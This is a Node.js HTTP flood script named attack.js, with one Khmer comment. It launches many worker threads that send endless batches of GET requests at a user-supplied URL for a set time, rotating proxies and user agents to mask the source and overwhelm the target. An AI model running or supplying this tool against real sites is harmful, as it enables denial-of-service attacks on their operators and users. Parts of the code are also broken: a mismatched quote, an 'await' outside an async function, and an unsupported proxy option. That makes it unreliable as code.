const { Worker, isMainThread, parentPort, workerData } = require('worker_threads');
const fs = require('fs');
const http = require('http');
const https = require('https');

// បើឯងមិនទាន់មាន proxy.txt និង ua.txt ទេ បង្កើតវាឡើង
let proxyList = [];
let userAgentList = [];

try {
    proxyList = fs.readFileSync('proxy.txt', 'utf-8').split('\n').filter(Boolean);
} catch(e) { console.log('No proxy.txt found, using default'); proxyList = ['127.0.0.1:8080']; }

try {
    userAgentList = fs.readFileSync('ua.txt', 'utf-8').split('\n').filter(Boolean);
} catch(e) { console.log('No ua.txt found, using default'); userAgentList = ['Mozilla/5.0']; }

if (isMainThread) {
    const [url, time] = process.argv.slice(2);
    const timeLimit = parseInt(time);
    if (!url || !timeLimit) {
        console.log('Usage: node attack.js <url> <time>');
        process.exit(1);
    }

    const numWorkers = require('os').cpus().length * 2;
    console.log('Starting ${numWorkers} workers for ${timeLimit}s on ${url}`);

    for (let i = 0; i < numWorkers; i++) {
        const worker = new Worker(__filename, {
            workerData: { url, timeLimit, workerId: i }
        });
        worker.on('error', (err) => console.log(`Worker ${i} error:`, err.message));
    }
} else {
    const { url, timeLimit, workerId } = workerData;
    
    const agents = [];
    for (let i = 0; i < 50; i++) {
        agents.push({
            http: new http.Agent({ keepAlive: true, maxSockets: Infinity }),
            https: new https.Agent({ keepAlive: true, maxSockets: Infinity, rejectUnauthorized: false })
        });
    }

    const sendRequest = (targetUrl, proxy, ua, agentIdx) => {
        return new Promise((resolve) => {
            const parsedUrl = new URL(targetUrl);
            const isHttps = parsedUrl.protocol === 'https:';
            const agent = isHttps ? agents[agentIdx % agents.length].https : agents[agentIdx % agents.length].http;
            
            const options = {
                hostname: parsedUrl.hostname,
                port: parsedUrl.port || (isHttps ? 443 : 80),
                path: parsedUrl.pathname + parsedUrl.search,
                method: 'GET',
                headers: {
                    'User-Agent': ua,
                    'Host': parsedUrl.hostname,
                    'Cache-Control': 'no-cache',
                    'Accept': '*/*',
                    'Connection': 'keep-alive'
                },
                agent: agent,
                timeout: 2000
            };

            if (proxy && proxy !== '127.0.0.1:8080') {
                const [proxyHost, proxyPort] = proxy.split(':');
                options.proxy = { host: proxyHost, port: parseInt(proxyPort) };
            }

            const req = (isHttps ? https : http).request(options, (res) => {
                res.resume();
                resolve();
            });
            req.on('error', () => resolve());
            req.on('timeout', () => { req.destroy(); resolve(); });
            req.end();
        });
    };

    const endTime = Date.now() + timeLimit * 1000;
    let sent = 0;
    
    const interval = setInterval(() => {
        console.log(`Worker ${workerId}: ${sent} req/s`);
        sent = 0;
    }, 1000);

    while (Date.now() < endTime) {
        const promises = [];
        for (let i = 0; i < 200; i++) {
            const proxy = proxyList[Math.floor(Math.random() * proxyList.length)];
            const ua = userAgentList[Math.floor(Math.random() * userAgentList.length)];
            promises.push(sendRequest(url, proxy, ua, sent + i));
            sent++;
        }
        await Promise.allSettled(promises);
    }
    clearInterval(interval);
}